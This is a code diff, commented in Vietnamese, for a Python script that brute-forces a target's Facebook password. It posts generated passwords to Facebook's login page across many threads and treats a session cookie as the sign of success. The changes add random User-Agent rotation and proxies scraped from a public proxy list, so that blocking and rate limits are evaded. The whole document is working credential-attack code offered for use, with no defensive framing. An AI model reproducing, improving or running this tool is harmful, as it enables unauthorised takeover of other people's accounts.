@@ -2,6 +2,8 @@ import itertools
 import requests
 import threading
 import queue
+import random
+import json
 
 # Các ký tự để thử trong mật khẩu
 characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"
@@ -13,21 +15,36 @@ result_queue = queue.Queue()
 # URL của trang đăng nhập Facebook
 login_url = "https://www.facebook.com/login.php"
 
-# Header để mô phỏng trình duyệt thật
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-}
+# Đọc danh sách User-Agent từ tệp JSON
+with open('user_agents.json', 'r') as file:
+    user_agents = json.load(file)
+
+# Hàm lấy proxy từ ProxyScrape
+def get_proxies():
+    try:
+        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
+        proxies = response.text.splitlines()
+        return proxies
+    except requests.RequestException as e:
+        print(f"Error fetching proxies: {str(e)}")
+        return []
 
 # Hàm thực hiện đăng nhập
-def login(target, password):
+def login(target, password, proxy=None):
     data = {
         'email': target,
         'pass': password,
         'login': 'Log In'
     }
     
+    headers = {
+        'User-Agent': random.choice(user_agents)
+    }
+    
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
     try:
-        response = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
+        response = requests.post(login_url, headers=headers, data=data, proxies=proxies, allow_redirects=False)
         
         if 'c_user' in response.cookies:
             return 1  # Đăng nhập thành công
@@ -47,13 +64,14 @@ def password_generator():
         length += 1
 
 # Hàm xử lý đa luồng
-def worker(target):
+def worker(target, proxies):
     while True:
         password = password_queue.get()
         if password is None:
             break
-        print(f"Trying password: {password}")
-        result = login(target, password)
+        proxy = random.choice(proxies) if proxies else None
+        print(f"Trying password: {password} with proxy: {proxy}")
+        result = login(target, password, proxy)
         if result == 1:
             result_queue.put(f"[+] Success! Password: {password}")
             break
@@ -66,10 +84,13 @@ def worker(target):
 def Main(target):
     num_threads = 20  # Số luồng để thử nghiệm
 
+    # Lấy danh sách proxy
+    proxies = get_proxies()
+
     # Tạo luồng thử mật khẩu
     threads = []
     for _ in range(num_threads):
-        t = threading.Thread(target=worker, args=(target,))
+        t = threading.Thread(target=worker, args=(target, proxies))
         t.daemon = True
         t.start()
         threads.append(t)
